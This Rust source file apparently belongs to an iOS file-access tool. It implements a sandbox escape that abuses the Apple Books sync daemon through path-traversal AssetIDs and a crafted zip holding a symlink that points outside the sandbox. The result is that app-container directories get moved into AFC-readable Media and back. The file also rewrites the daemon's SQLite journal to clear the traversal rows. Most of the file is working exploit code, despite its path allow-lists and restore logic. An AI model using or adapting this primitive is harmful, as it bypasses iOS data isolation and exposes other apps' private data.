//! Airlift *pull-then-restore* directory listing — AirManager's trick, no HouseArrest.
//!
//! AirCard/AirManager never use `com.apple.mobile.house_arrest` to *read* a
//! container: they abuse the Apple Books sync engine (`com.apple.atc` +
//! `com.apple.streaming_zip_conduit`) as a "move any object anywhere" primitive
//! and read the result back over ordinary AFC, whose root is
//! `/var/mobile/Media`.
//!
//! # The three base systems
//!
//! * **Real / jail path** — e.g. `/var/mobile/Containers/Data/Application/<uuid>/Data`.
//!   This is what the caller hands in (`al_airlift_list_dir`).
//! * **Books/Sync-relative (`AssetID`)** — relative to `/var/mobile/Media/Books/Sync`,
//!   because that is the directory holding `Books.plist`. `"../../X"` is
//!   `<Media>/X`, `"../../../a"` is `/var/mobile/a`.
//! * **Media-root-relative (`AssetPath`)** — relative to `/var/mobile/Media`, so
//!   `"Airlock/Read/<T>"` is `/var/mobile/Media/Airlock/Read/<T>`.
//!
//! `FileComplete { AssetID, AssetPath }` makes the Books daemon **move** the
//! object `AssetID` to `AssetPath` (Media-relative), resolving symlinks on the
//! way. Directories move as a unit. That is the whole primitive.
//!
//! # STEP A/B/C/D, per call
//!
//! ```text
//! STEP A  stage_restore_symlink   zip one symlink airlift-pull-<T>/p0/p1/p2/link
//!                                -> ../../../<parent of target, no leading />
//! STEP B  atc_asset_sync (1 asset) ../../../<target rel. to /var/mobile>
//!                                 -> Airlock/Read/<T>          (PULL)
//! STEP D  write_recovery_record   Airlock/Read/<T>.json        (before STEP C)
//! STEP C  atc_asset_sync (2 assets, one session, in order)
//!           ../../airlift-pull-<T>/p0/p1/p2/link -> airlift-link-<T>
//!           ../../Airlock/Read/<T>              -> airlift-link-<T>/<basename>
//! STEP D  cleanup + Books.plist restore
//! ```
//!
//! After STEP C the moved symlink sits at `/var/mobile/Media/airlift-link-<T>`
//! (the *object* is renamed to the `AssetPath` — the `p0/p1/p2` nesting is not
//! reproduced), so `"../../../var/mobile/<x>"` resolves `/var/mobile/Media`
//! → `/` → `/var/mobile/<x>`, i.e. the real target parent. STEP C's second
//! `FileComplete` then drops the pulled directory back through that symlink.
//!
//! # Why the symlink carries `../../../var/mobile/…` and not `../../../<a>`
//!
//! The link is *relocated* by STEP C before it is ever followed, and it always
//! ends up directly under the Media root — exactly three levels below `/`, so
//! `"../../.."` is `/` and the tail has to repeat `var/mobile`. The same
//! arithmetic fixes the STEP B `AssetID`: it is spelled relative to
//! `/var/mobile/Media/Books/Sync`, so `../../..` is `/var/mobile` and the tail
//! is the path *relative to `/var/mobile`* (`../../../Containers/…`), never the
//! full `/var/mobile/…` spelling.
//!
//! # Safety model
//!
//! * **Never automatic.** Nothing here runs at app launch or from a scroll
//!   view; the only entry points are the two `al_airlift_*` FFI functions that
//!   the Swift caller has to invoke for the current directory explicitly.
//! * `checked_pull_path` refuses anything outside the app-container roots
//!   (`…/Containers/Data/Application`, `…/Containers/Shared/AppGroup`,
//!   `/var/mobile/Applications`) and any `..` component. `/var/mobile/Media`
//!   is *not* reachable, so the Airlift staging zone cannot be targeted.
//! * `Books/Sync/Books.plist` is snapshotted before the first sync (in memory
//!   *and* in a temp file inside the app container) and restored after every
//!   step. `OutstandingAssets_*.sqlite` is treated as volatile — never
//!   snapshotted, never restored, only edited (see `clean_outstanding`).
//! * One process-wide mutex (the same `lock_tunnel` the AFC browser uses)
//!   serialises every ATC sync.
//! * Nothing is deleted unless the *next* link in the chain is confirmed by
//!   AFC, so an interrupted pull always leaves the data reachable at
//!   `Airlock/Read/<T>` with a `<T>.json` recovery record next to it.

use std::ffi::{c_char, c_void};
use std::time::Duration;

use idevice::afc::opcode::AfcFopenMode;
use idevice::afc::AfcClient;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

use crate::browse::{
    base64_decode, base64_encode, finish_string_result, list_dir_json, lock_tunnel,
};
use crate::exploit::{
    atc_message_name, connect_tunnel, make_atc_msg, new_item_base, random_hex, read_atc_dict,
    send_atc_dict, AppDeviceTunnel, Logger, ALLogCallback, LINK_PREFIX,
};
use crate::ffi_util::{opt_str, run_with_large_stack};

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

/// Media-root-relative directory the pulled directories are parked in.
const AIRLOCK_READ: &str = "Airlock/Read";
/// Media-root-relative staging directory for the restore symlink zip.
const PULL_PREFIX: &str = "airlift-pull-";
/// AFC-relative path of the Books sync manifest we rewrite for every step.
const BOOKS_PLIST: &str = "Books/Sync/Books.plist";
/// Zip entry holding the restore symlink inside the staged MediaSubdir.
const LINK_ENTRY: &str = "p0/p1/p2/link";

/// Sync metadata that is snapshotted before, and restored after, every step.
///
/// `Books/Sync/Books.plist` is the catalog the daemon parses, so it is the one
/// file that is snapshotted and put back byte-for-byte.
///
/// `OutstandingAssets_*.sqlite` is the daemon's outstanding-asset journal and is
/// **volatile**: see [`is_volatile_sync_state`] — it is cleaned by
/// [`clean_outstanding`], never restored. Both plausible spellings (with/without
/// the `Database` component) and the `-wal`/`-shm` siblings are listed so the
/// snapshot keeps naming every file it once covered.
const SYNC_STATE_FILES: &[&str] = &[
    BOOKS_PLIST,
    "Books/Sync/Database/OutstandingAssets_4.sqlite",
    "Books/Sync/Database/OutstandingAssets_4.sqlite-wal",
    "Books/Sync/Database/OutstandingAssets_4.sqlite-shm",
    "Books/Sync/OutstandingAssets_4.sqlite",
    "Books/Sync/OutstandingAssets_4.sqlite-wal",
    "Books/Sync/OutstandingAssets_4.sqlite-shm",
];

/// Largest sync-metadata file that is snapshotted (16 MiB).
const MAX_BACKUP_BYTES: usize = 16 * 1024 * 1024;
/// AFC directories that may hold the outstanding-asset journal.
const OUTSTANDING_DIRS: &[&str] = &["Books/Sync/Database", "Books/Sync"];
/// Tables `OutstandingAssets_*.sqlite` keeps outstanding-asset rows in.
const OUTSTANDING_TABLES: &[&str] = &["ZBCOUTSTANDINGASSET", "ZBCINSTALLEDASSET"];

/// Catalog rows the pull manifest may carry alongside the requested one.
/// The reference allows 127 preserved rows next to at most 128 manifest
/// entries: acl/crates/core/src/books.rs:137 and
/// acl/crates/airtraffic/src/handshake.rs:238.
const MAX_PRESERVED_ROWS: usize = 127;
/// Pause between two `FileComplete` messages inside one session. Order matters
/// (symlink first, directory second), so the daemon must have finished the
/// first move before the second is announced.
const FILE_COMPLETE_PAUSE: Duration = Duration::from_millis(900);

/// Device roots a pull is allowed to touch.
const PULL_ROOTS: &[&str] = &[
    "/var/mobile/Containers/Data/Application",
    "/var/mobile/Containers/Shared/AppGroup",
    "/var/mobile/Applications",
];

// ---------------------------------------------------------------------------
// Path helpers (pure, unit-tested)
// ---------------------------------------------------------------------------

/// Validate a caller-supplied device path for a pull.
///
/// Normalises `/private/var/…` to `/var/…`, collapses repeated slashes and
/// strips the trailing one, then requires the result to live under one of
/// [`PULL_ROOTS`]. `..` is refused outright — the only `..` this file ever
/// emits is the fixed three-segment prefix inside an `AssetID`/`LinkTarget`,
/// which is derived from the base systems above and never from caller input.
pub(crate) fn checked_pull_path(path: &str) -> Result<String, String> {
    let trimmed = path.trim();
    if trimmed.is_empty() {
        return Err("path must not be empty".to_owned());
    }
    if !trimmed.starts_with('/') {
        return Err(format!(
            "path must be an absolute device path such as /var/mobile/Containers/Data/Application/<uuid>/Documents, got '{trimmed}'"
        ));
    }

    let mut components: Vec<&str> = Vec::new();
    for component in trimmed.split('/') {
        if component.is_empty() {
            continue;
        }
        if component == ".." {
            return Err(format!("path must not contain '..', got '{trimmed}'"));
        }
        if component == "Airlock" || component == "Books.plist" {
            return Err(format!("'{component}' is reserved by Airlift and cannot be pulled"));
        }
        components.push(component);
    }
    // `/private/var/…` and `/var/…` are the same directory on device: only the
    // `private` prefix goes away, the `var` component is part of the path.
    if components.first() == Some(&"private") && components.get(1) == Some(&"var") {
        components.remove(0);
    }
    if components.len() < 3 || components[0] != "var" || components[1] != "mobile" {
        return Err(format!(
            "path must live under /var/mobile, got '{trimmed}'"
        ));
    }

    let normalized = format!("/{}", components.join("/"));
    if !PULL_ROOTS
        .iter()
        .any(|root| normalized == *root || normalized.starts_with(&format!("{root}/")))
    {
        return Err(format!(
            "path must live under {} (app containers), got '{normalized}'",
            PULL_ROOTS.join(", ")
        ));
    }
    Ok(normalized)
}

/// Split a normalised absolute path into `(parent, basename)`.
///
/// The parent is where the restore symlink points, so it has to be a real
/// directory under `/var/mobile` — `/var/mobile` itself and anything shallower
/// is refused (there would be no parent to drop the directory back into).
fn parent_and_basename(abs: &str) -> Result<(String, String), String> {
    let trimmed = abs.trim_end_matches('/');
    match trimmed.rsplit_once('/') {
        Some((parent, name))
            if !name.is_empty() && parent.starts_with("/var/mobile/") =>
        {
            Ok((parent.to_owned(), name.to_owned()))
        }
        _ => Err(format!(
            "'{abs}' has no usable parent directory; pull a directory inside an app container"
        )),
    }
}

/// `LinkTarget` for the staged symlink: three levels up from the Media root
/// is `/`, so the tail repeats `var/mobile`.
fn link_target_for_parent(parent_abs: &str) -> String {
    format!("../../../{}", parent_abs.trim_start_matches('/'))
}

/// `AssetID` naming a real device path, relative to `Books/Sync`
/// (`/var/mobile/Media/Books/Sync`). `../../..` is `/var/mobile`, so the tail
/// is the path *relative to `/var/mobile`* — not the full `/var/mobile/…`
/// spelling, which would resolve one level too deep.
fn asset_id_for_device_path(abs: &str) -> Result<String, String> {
    let rest = abs
        .trim_end_matches('/')
        .strip_prefix("/var/mobile/")
        .ok_or_else(|| format!("'{abs}' is not under /var/mobile"))?;
    if rest.is_empty() {
        return Err(format!("'{abs}' has nothing to pull"));
    }
    Ok(format!("../../../{rest}"))
}

/// `AssetID` naming an object inside `/var/mobile/Media` (`../../` is the
/// Media root, which is where AFC and the zip staging live).
fn media_asset_id(relative_to_media: &str) -> String {
    format!("../../{relative_to_media}")
}

/// `path` names the Books daemon's outstanding-asset journal, which must never be
/// snapshotted or restored byte-for-byte.
///
/// `OutstandingAssets_*.sqlite` and its `-wal`/`-shm` sidecars are *volatile*:
/// the daemon rewrites them on every sync, so byte-comparing one against a
/// snapshot only ever yields a false "Books state differs" conflict, and
/// writing a stale copy back resurrects rows the daemon has already retired.
/// [`clean_outstanding`] is what edits them instead.
fn is_volatile_sync_state(path: &str) -> bool {
    path.rsplit('/')
        .next()
        .is_some_and(|name| name.starts_with("OutstandingAssets_") && name.contains(".sqlite"))
}

// ---------------------------------------------------------------------------
// OutstandingAssets journal hygiene
// ---------------------------------------------------------------------------

#[link(name = "sqlite3")]
extern "C" {
    fn sqlite3_open_v2(
        filename: *const libc::c_char,
        db: *mut *mut libc::c_void,
        flags: libc::c_int,
        vfs: *const libc::c_char,
    ) -> libc::c_int;
    fn sqlite3_exec(
        db: *mut libc::c_void,
        sql: *const libc::c_char,
        callback: *mut libc::c_void,
        arg: *mut libc::c_void,
        errmsg: *mut *mut libc::c_char,
    ) -> libc::c_int;
    fn sqlite3_errmsg(db: *mut libc::c_void) -> *const libc::c_char;
    fn sqlite3_free(ptr: *mut libc::c_void);
    fn sqlite3_close_v2(db: *mut libc::c_void) -> libc::c_int;
}

const SQLITE_OPEN_READWRITE: libc::c_int = 0x00000002;
const SQLITE_OPEN_CREATE: libc::c_int = 0x00000004;
const SQLITE_OK: libc::c_int = 0;

/// Delete the dead outstanding-asset rows from one database image.
///
/// `ZPERSISTENTID LIKE '../%'` is the CarrierSIM-fixpack fix (verified on
/// iOS 27), repeated for both tables the daemon uses. Such a row is an
/// `AssetID` that was only ever meaningful relative to the sync that created
/// it (`../../…`); once that sync is over the id is dead, and leaving it in the
/// journal is what makes the next run look like its manifest was never
/// accepted.
///
/// The image is edited on a scratch copy in the process temp directory — never
/// the device file in place — so a failure half way through leaves the original
/// bytes untouched. Returns the rewritten image, or `Err` with SQLite's own
/// message.
fn purge_dead_outstanding_rows(bytes: &[u8]) -> Result<Vec<u8>, String> {
    use std::ffi::CString;

    let scratch = std::env::temp_dir().join(format!(
        "airlift-outstanding-{}-{}.sqlite",
        std::process::id(),
        random_hex(6)
    ));
    let scratch_c = CString::new(scratch.to_string_lossy().as_bytes())
        .map_err(|e| format!("scratch path is not NUL-terminated: {e}"))?;
    // On any early return the scratch database must not be left behind — and in
    // WAL mode SQLite puts two more files next to it, so all three go.
    let _cleanup = scopeguard(scratch.clone(), |p| {
        let _ = std::fs::remove_file(p);
        for suffix in ["-wal", "-shm", "-journal"] {
            let sidecar = p.with_file_name(format!(
                "{}{suffix}",
                p.file_name().unwrap_or_default().to_string_lossy()
            ));
            let _ = std::fs::remove_file(sidecar);
        }
    });

    std::fs::write(&scratch, bytes).map_err(|e| format!("write scratch copy: {e}"))?;

    let mut db: *mut libc::c_void = std::ptr::null_mut();
    // SAFETY: `scratch_c` outlives the handle; `db` is a fresh out-pointer and
    // SQLite zero-initialises it.
    let rc = unsafe {
        sqlite3_open_v2(
            scratch_c.as_ptr(),
            &mut db,
            SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE,
            std::ptr::null(),
        )
    };
    if rc != SQLITE_OK {
        // SQLite allocates the handle even on failure so the message can be read.
        let msg = if db.is_null() {
            format!("sqlite3_open_v2 failed with code {rc}")
        } else {
            let m = unsafe { std::ffi::CStr::from_ptr(sqlite3_errmsg(db)) }
                .to_string_lossy()
                .into_owned();
            unsafe { sqlite3_close_v2(db) };
            format!("sqlite3_open_v2: {m}")
        };
        return Err(msg);
    }

    let mut outcome: Result<Vec<u8>, String> = Ok(Vec::new());
    for table in OUTSTANDING_TABLES {
        let sql = CString::new(format!(
            "delete from {table} where ZPERSISTENTID like '../%'"
        ))
        .expect("table names are literal, so this cannot contain a NUL");
        let mut errmsg: *mut libc::c_char = std::ptr::null_mut();
        // SAFETY: `db` is an open handle, `sql` outlives the call, and both
        // out-params are pre-initialised.
        let rc = unsafe {
            sqlite3_exec(
                db,
                sql.as_ptr(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                &mut errmsg,
            )
        };
        if rc != SQLITE_OK {
            let msg = if errmsg.is_null() {
                format!("sqlite3_exec failed with code {rc}")
            } else {
                let m = unsafe { std::ffi::CStr::from_ptr(errmsg) }
                    .to_string_lossy()
                    .into_owned();
                unsafe { sqlite3_free(errmsg.cast()) };
                m
            };
            outcome = Err(format!("{table}: {msg}"));
            break;
        }
    }

    if outcome.is_ok() {
        // Close *before* reading: in WAL mode — which is what the on-device
        // journal uses, hence its `-wal`/`-shm` siblings — the committed pages
        // only reach the main database file when the last handle goes away, so
        // reading while the handle is still open would return the pre-cleanup
        // bytes.
        // SAFETY: `db` came from a successful sqlite3_open_v2 and is closed once.
        unsafe { sqlite3_close_v2(db) };
        match std::fs::read(&scratch) {
            Ok(out) => outcome = Ok(out),
            Err(e) => outcome = Err(format!("read back scratch copy: {e}")),
        }
    } else {
        // SAFETY: as above; this is the only other path that reaches the close.
        unsafe { sqlite3_close_v2(db) };
    }
    outcome
}

/// Minimal `scopeguard`: run `f(path)` when this goes out of scope.
struct ScopeGuard<F: FnOnce(&std::path::PathBuf)> {
    path: std::path::PathBuf,
    run: Option<F>,
}

impl<F: FnOnce(&std::path::PathBuf)> Drop for ScopeGuard<F> {
    fn drop(&mut self) {
        if let Some(run) = self.run.take() {
            run(&self.path);
        }
    }
}

fn scopeguard<F: FnOnce(&std::path::PathBuf)>(
    path: std::path::PathBuf,
    run: F,
) -> ScopeGuard<F> {
    ScopeGuard {
        path,
        run: Some(run),
    }
}

/// Drop every dead outstanding-asset row, so a sync can be repeated.
///
/// Every ATC session leaves `../../…`-rooted rows behind in
/// `Books/Sync/Database/OutstandingAssets_*.sqlite`; they are dead the moment
/// the session ends, and they are what makes the *second* run of an asset look
/// like the daemon rejected its manifest. This runs twice per pull — once right
/// after the snapshot is taken, once again immediately before the state is
/// restored — so a failed first attempt self-heals on the next one.
///
/// Entirely best-effort: a missing directory, an unreadable database or a
/// SQLite complaint is logged as a single line and never fails the run, because
/// nothing here is load-bearing for the move itself.
async fn clean_outstanding(afc: &mut AfcClient, logger: &Logger) {
    let mut targets: Vec<String> = Vec::new();
    for dir in OUTSTANDING_DIRS {
        let names = match afc.list_dir((*dir).to_owned()).await {
            Ok(names) => names,
            Err(e) => {
                logger.log(format!("airlift: warning: cannot list {dir} for the outstanding-asset journal ({e:?})"));
                continue;
            }
        };
        for name in names {
            if name.is_empty() || name == "." || name == ".." {
                continue;
            }
            if is_volatile_sync_state(&name) && !name.contains("-wal") && !name.contains("-shm") {
                targets.push(format!("{dir}/{name}"));
            }
        }
    }

    if targets.is_empty() {
        logger.log(
            "airlift: no OutstandingAssets_*.sqlite to clean (nothing outstanding is journalled)",
        );
        return;
    }

    for path in targets {
        let mut fd = match afc.open(path.clone(), AfcFopenMode::RdOnly).await {
            Ok(fd) => fd,
            Err(e) => {
                logger.log(format!(
                    "airlift: warning: cannot read {path} to drop dead rows ({e:?})"
                ));
                continue;
            }
        };
        let read = fd.read_entire().await;
        let _ = fd.close().await;
        let bytes = match read {
            Ok(bytes) => bytes,
            Err(e) => {
                logger.log(format!(
                    "airlift: warning: cannot read {path} to drop dead rows ({e:?})"
                ));
                continue;
            }
        };

        match purge_dead_outstanding_rows(&bytes) {
            Ok(cleaned) => {
                // `open(WrOnly)` does NOT truncate, so a shorter rewrite would
                // keep the tail of the longer original. Remove first.
                let _ = afc.remove(path.clone()).await;
                match afc.open(path.clone(), AfcFopenMode::WrOnly).await {
                    Ok(mut fd) => {
                        let write = fd.write_entire(&cleaned).await;
                        let close = fd.close().await;
                        if write.is_ok() && close.is_ok() {
                            logger.log(format!(
                                "airlift: dropped the '../%' rows from {path} ({} byte(s) in, {} byte(s) out)",
                                bytes.len(),
                                cleaned.len()
                            ));
                        } else {
                            logger.log(format!(
                                "airlift: warning: could not write the cleaned {path} back (write={:?} close={:?})",
                                write.err(),
                                close.err()
                            ));
                        }
                    }
                    Err(e) => logger.log(format!(
                        "airlift: warning: cannot reopen {path} to write the cleaned rows back ({e:?})"
                    )),
                }
            }
            Err(e) => logger.log(format!(
                "airlift: warning: leaving {path} alone, its '../%' rows need a device-side edit ({e})"
            )),
        }

        // The WAL/SHM pair belongs to the image that was just replaced; leaving
        // them behind would let the daemon replay the pre-cleanup rows.
        for suffix in ["-wal", "-shm"] {
            let sidecar = format!("{path}{suffix}");
            if afc.remove(sidecar.clone()).await.is_ok() {
                logger.log(format!("airlift: removed the {sidecar} sidecar"));
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Books sync-state snapshot
// ---------------------------------------------------------------------------

/// What was found at one sync-metadata path when the snapshot was taken.
#[derive(Clone, Debug, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
#[serde(tag = "state", rename_all = "snake_case")]
enum BackupState {
    /// Existed and is small enough to restore byte-for-byte.
    Present { data_b64: String },
    /// Did not exist — restore removes whatever is there now.
    Absent,
    /// Existed but was too large to hold in memory. Never written to, so the
    /// restore must leave it exactly as it is.
    Untouched,
}

#[derive(Clone, serde::Serialize, serde::Deserialize)]
struct BooksSyncBackup {
    token: String,
    entries: Vec<(String, BackupState)>,
}

impl BooksSyncBackup {
    /// Read every sync-metadata file over AFC. Missing files are recorded as
    /// [`BackupState::Absent`] so the restore can undo a create.
    ///
    /// Volatile entries ([`is_volatile_sync_state`]) are recorded as
    /// [`BackupState::Untouched`] without being read: the daemon rewrites them
    /// on every sync, so they are cleaned by [`clean_outstanding`] instead of
    /// being snapshotted and written back byte-for-byte.
    async fn capture(afc: &mut AfcClient, token: &str, logger: &Logger) -> Self {
        let mut entries = Vec::with_capacity(SYNC_STATE_FILES.len());
        let mut volatile = 0usize;
        for path in SYNC_STATE_FILES {
            if is_volatile_sync_state(path) {
                volatile += 1;
                entries.push(((*path).to_owned(), BackupState::Untouched));
                continue;
            }
            let state = match afc.get_file_info((*path).to_owned()).await {
                Ok(info) if info.size > MAX_BACKUP_BYTES => {
                    logger.log(format!(
                        "airlift: {path} is {} bytes (over {MAX_BACKUP_BYTES}); snapshotting it as Untouched",
                        info.size
                    ));
                    BackupState::Untouched
                }
                Ok(_) => match afc.open((*path).to_owned(), AfcFopenMode::RdOnly).await {
                    Ok(mut fd) => {
                        let read = fd.read_entire().await;
                        let _ = fd.close().await;
                        match read {
                            Ok(data) if data.len() <= MAX_BACKUP_BYTES => {
                                BackupState::Present { data_b64: base64_encode(&data) }
                            }
                            Ok(data) => {
                                logger.log(format!(
                                    "airlift: {path} read {} bytes (over {MAX_BACKUP_BYTES}); snapshotting it as Untouched",
                                    data.len()
                                ));
                                BackupState::Untouched
                            }
                            Err(e) => {
                                logger.log(format!(
                                    "airlift: snapshot read of {path} failed: {e:?}; leaving it untouched"
                                ));
                                BackupState::Untouched
                            }
                        }
                    }
                    Err(e) => {
                        logger.log(format!(
                            "airlift: snapshot open of {path} failed: {e:?}; leaving it untouched"
                        ));
                        BackupState::Untouched
                    }
                },
                Err(_) => BackupState::Absent,
            };
            entries.push(((*path).to_owned(), state));
        }
        logger.log(format!(
            "airlift: snapshotted {} Books sync-state file(s), {volatile} volatile outstanding-asset file(s) left alone",
            entries.len()
        ));
        Self { token: token.to_owned(), entries }
    }

    /// Put the snapshotted bytes back. Best-effort: a failure here is logged
    /// and reported, never silently swallowed.
    ///
    /// Volatile entries are skipped outright, so a snapshot taken before the
    /// journal was declared volatile cannot resurrect the dead `../%` rows.
    async fn restore(&self, afc: &mut AfcClient, logger: &Logger) -> Result<(), String> {
        let _ = afc.mk_dir("Books").await;
        let _ = afc.mk_dir("Books/Sync").await;
        let _ = afc.mk_dir("Books/Sync/Database").await;
        let mut failures: Vec<String> = Vec::new();
        for (path, state) in &self.entries {
            if is_volatile_sync_state(path) {
                continue;
            }
            match state {
                BackupState::Present { data_b64 } => {
                    let bytes = base64_decode(data_b64)
                        .map_err(|e| format!("decode snapshot of {path}: {e}"))?;
                    // `open(WrOnly)` does NOT truncate, so a shorter snapshot
                    // would keep the tail of the longer previous file.
                    let _ = afc.remove(path.clone()).await;
                    match afc.open(path.clone(), AfcFopenMode::WrOnly).await {
                        Ok(mut fd) => {
                            let write = fd.write_entire(&bytes).await;
                            let close = fd.close().await;
                            if write.is_err() || close.is_err() {
                                failures.push(format!(
                                    "{path}: write={:?} close={:?}",
                                    write.err(),
                                    close.err()
                                ));
                            }
                        }
                        Err(e) => failures.push(format!("{path}: open failed: {e:?}")),
                    }
                }
                BackupState::Absent => {
                    // Best-effort delete; `NotFound` is the expected outcome.
                    if afc.remove(path.clone()).await.is_ok() {
                        logger.log(format!("airlift: removed transient {path}"));
                    }
                }
                BackupState::Untouched => {}
            }
        }
        if failures.is_empty() {
            logger.log("airlift: restored Books sync state");
            Ok(())
        } else {
            Err(format!("Books sync-state restore incomplete: {}", failures.join("; ")))
        }
    }

    /// The snapshotted `Books/Sync/Books.plist` bytes, if the capture kept them.
    fn books_plist_bytes(&self) -> Option<Vec<u8>> {
        self.entries.iter().find_map(|(path, state)| {
            if path != BOOKS_PLIST {
                return None;
            }
            match state {
                BackupState::Present { data_b64 } => base64_decode(data_b64).ok(),
                BackupState::Absent | BackupState::Untouched => None,
            }
        })
    }

    /// Catalog rows to re-emit in the pull manifest, so the request keeps the
    /// device's own catalog intact instead of replacing it.
    ///
    /// See [`preserved_rows`] for the derivation from the AirCard reference.
    fn preserved_manifest_rows(&self, identifiers: &[String]) -> Result<Vec<plist::Value>, String> {
        let bytes = self.books_plist_bytes();
        preserved_rows(bytes.as_deref(), identifiers).map(|(rows, _)| rows)
    }

    /// Persist the snapshot next to the app in its container temp directory so
    /// a crash mid-sequence still leaves the original manifest on disk.
    fn save_to_temp(&self) -> std::io::Result<std::path::PathBuf> {
        let path = std::env::temp_dir().join(format!("airlift-books-sync-{}.json", self.token));
        let bytes = serde_json::to_vec_pretty(self)
            .map_err(|e| std::io::Error::other(format!("encode snapshot: {e}")))?;
        std::fs::write(&path, bytes)?;
        Ok(path)
    }
}

// ---------------------------------------------------------------------------
// Recovery record
// ---------------------------------------------------------------------------

/// Written to `Airlock/Read/<T>.json` after the pull succeeds and before the
/// restore, so an interrupted run can be finished by `al_airlift_recover`.
#[derive(Clone, serde::Serialize, serde::Deserialize)]
struct RecoveryRecord {
    target: String,
    token: String,
    basename: String,
    parent: String,
}

impl RecoveryRecord {
    /// A record read back off the device is untrusted input: `parent` decides
    /// what the restore symlink points at and `basename` names the destination
    /// leaf, so both have to be re-validated before anything is staged or
    /// moved. Without this a corrupt record would turn `al_airlift_recover`
    /// into an arbitrary-write primitive.
    fn validate(&self) -> Result<(), String> {
        let parent = checked_pull_path(&self.parent)
            .map_err(|e| format!("recovery record parent rejected: {e}"))?;
        if parent != self.parent.trim_end_matches('/') {
            return Err(format!(
                "recovery record parent '{}' is not in canonical form (expected '{parent}')",
                self.parent
            ));
        }
        let target = checked_pull_path(&self.target)
            .map_err(|e| format!("recovery record target rejected: {e}"))?;
        if !target.starts_with(&format!("{parent}/")) {
            return Err(format!(
                "recovery record target '{target}' is not inside its parent '{parent}'"
            ));
        }
        if self.basename.is_empty()
            || self.basename.contains('/')
            || self.basename == "."
            || self.basename == ".."
        {
            return Err(format!(
                "recovery record basename '{}' is not a single safe name",
                self.basename
            ));
        }
        if self.basename != target.rsplit('/').next().unwrap_or_default() {
            return Err(format!(
                "recovery record basename '{}' does not match target '{target}'",
                self.basename
            ));
        }
        if self.token.is_empty()
            || !self
                .token
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '-')
        {
            return Err(format!(
                "recovery record token '{}' is not a plain token",
                self.token
            ));
        }
        Ok(())
    }
}

// ---------------------------------------------------------------------------
// Zip / AFC primitives
// ---------------------------------------------------------------------------

/// StreamingZip archive holding exactly one symlink, `p0/p1/p2/link`.
///
/// Same shape as the proven write path's archive (META-INF ZipMetadata
/// plist, `p0/p1/p2` directories, the `0x5A53` extra field carrying the unix
/// mode) minus the payload file: the only thing this archive has to produce is
/// a dangling symlink whose `LinkTarget` reaches out of the sandbox.
fn build_symlink_archive(
    link_target: &str,
) -> Result<Vec<u8>, Box<dyn std::error::Error + Send + Sync>> {
    use std::io::Write as _;

    use zip::write::{ExtendedFileOptions, FileOptions};
    use zip::{CompressionMethod, ZipWriter};

    let mut buf = Vec::new();
    let mut zip = ZipWriter::new(std::io::Cursor::new(&mut buf));

    fn zip_opts(mode: u32) -> FileOptions<'static, ExtendedFileOptions> {
        let mut opts = FileOptions::default()
            .compression_method(CompressionMethod::Stored)
            .unix_permissions(mode);
        let mode_bytes = (mode as u16).to_le_bytes();
        let _ = opts.add_extra_data(0x5A53, Box::new(mode_bytes), false);
        opts
    }

    zip.add_directory("META-INF/", zip_opts(0o040755))?;
    zip.start_file("META-INF/com.apple.ZipMetadata.plist", zip_opts(0o100600))?;
    let meta_plist: plist::Value = {
        let mut d = plist::Dictionary::new();
        d.insert("Version".to_owned(), plist::Value::Integer(2.into()));
        plist::Value::Dictionary(d)
    };
    let mut meta_buf = Vec::new();
    plist::to_writer_binary(&mut meta_buf, &meta_plist)?;
    zip.write_all(&meta_buf)?;

    for dir in ["p0/", "p0/p1/", "p0/p1/p2/"] {
        zip.add_directory(dir, zip_opts(0o040755))?;
    }
    zip.add_symlink(LINK_ENTRY, link_target, zip_opts(0o120777))?;
    zip.finish()?;
    Ok(buf)
}

/// STEP A — stage the restore symlink under `media_subdir` with the
/// `streaming_zip_conduit` handshake, read the `DataComplete` reply and verify
/// the link really landed (a symlink whose target dangles still shows up in
/// AFC, so the check is about the staging, not about reachability).
async fn stage_restore_symlink(
    tunnel: &mut AppDeviceTunnel,
    afc: &mut AfcClient,
    media_subdir: &str,
    link_target: &str,
    logger: &Logger,
) -> Result<(), String> {
    let archive =
        build_symlink_archive(link_target).map_err(|e| format!("build_symlink_archive: {e}"))?;
    logger.log(format!(
        "airlift: STEP A staging restore symlink at {media_subdir}/{LINK_ENTRY} -> {link_target} ({} bytes)",
        archive.len()
    ));

    let mut zip_stream = tunnel
        .connect_service("com.apple.streaming_zip_conduit", logger)
        .await?;

    let mut zip_init_dict = plist::Dictionary::new();
    zip_init_dict.insert(
        "MediaSubdir".to_string(),
        plist::Value::String(media_subdir.to_owned()),
    );
    let mut init_buf = Vec::new();
    plist::to_writer_binary(&mut init_buf, &plist::Value::Dictionary(zip_init_dict))
        .map_err(|e| format!("encode MediaSubdir: {e}"))?;
    zip_stream
        .write_all(&(init_buf.len() as u32).to_be_bytes())
        .await
        .map_err(|e| format!("write MediaSubdir length: {e}"))?;
    zip_stream
        .write_all(&init_buf)
        .await
        .map_err(|e| format!("write MediaSubdir body: {e}"))?;
    zip_stream.flush().await.map_err(|e| format!("flush: {e}"))?;

    zip_stream
        .write_all(&archive)
        .await
        .map_err(|e| format!("write archive bytes: {e}"))?;
    zip_stream.flush().await.map_err(|e| format!("flush: {e}"))?;

    let mut resp_len_buf = [0u8; 4];
    zip_stream
        .read_exact(&mut resp_len_buf)
        .await
        .map_err(|e| format!("read zip response length: {e}"))?;
    let resp_len = u32::from_be_bytes(resp_len_buf) as usize;
    let mut resp_body = vec![0u8; resp_len];
    zip_stream
        .read_exact(&mut resp_body)
        .await
        .map_err(|e| format!("read zip response body: {e}"))?;
    drop(zip_stream);

    match plist::from_bytes::<plist::Value>(&resp_body) {
        Ok(plist::Value::Dictionary(dict)) => {
            let name = atc_message_name(&dict).unwrap_or_else(|| "<unnamed>".to_owned());
            logger.log(format!("airlift: STEP A streaming_zip_conduit replied '{name}'"));
        }
        _ => logger.log(format!(
            "airlift: STEP A streaming_zip_conduit replied with {} unparsed byte(s)",
            resp_body.len()
        )),
    }

    let staged = format!("{media_subdir}/{LINK_ENTRY}");
    afc.get_file_info(staged.clone()).await.map_err(|e| {
        format!("STEP A verification failed: {staged} missing from Media ({e:?})")
    })?;
    logger.log(format!("airlift: STEP A verified {staged} in Media"));
    Ok(())
}

